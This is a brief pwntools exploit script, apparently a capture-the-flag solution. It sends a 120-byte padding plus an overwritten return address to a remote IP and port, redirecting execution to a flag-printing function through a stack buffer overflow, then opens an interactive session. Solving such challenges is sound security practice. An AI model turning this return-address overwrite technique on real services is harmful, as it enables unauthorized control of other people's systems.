from pwn import *

# details
HOST = "20.166.26.247"
PORT = 1337

win_func = p64(0x00000000004011f6)  # the function that prints the flag (it is named "jump()")
padding = b"A"*120 ## offset to saved rip on the stack

payload = padding + win_func # constructing the payload

r = remote(HOST, PORT) # connecting
r.sendline(payload) # sending the payload
#print(r.recvall())
r.interactive()